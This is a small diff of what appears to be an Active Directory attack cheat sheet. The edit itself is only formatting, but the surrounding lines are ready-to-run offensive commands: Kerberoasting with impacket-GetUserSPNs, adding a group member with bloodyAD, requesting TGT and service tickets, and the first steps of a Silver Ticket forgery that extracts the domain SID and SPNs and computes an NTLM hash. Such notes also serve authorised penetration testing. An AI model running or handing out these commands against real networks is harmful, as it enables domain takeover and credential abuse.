@@ -338,10 +338,8 @@ while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetU
 
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
 
-sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
-
 +---------- Ticket Attacks ----------+
-
+sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
 KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
 [libdefaults]
     default_realm = $KRB5DOM
@@ -363,9 +361,7 @@ TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?
 
 ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
-
 +---------- Silver Ticket Attacks ----------+
-
 TICKET_SID=$(impacket-getPac '$DOM'/'$USERNAME':'$PASSWORD' -targetUser 'Administrator' 2>/dev/null | grep 'Domain SID: ' | cut -d ':' -f 2- | tr -d ' ')
 TICKET_SPN=$(impacket-GetUserSPNs -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD' -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1)
 TICKET_NTLM=$(echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/')
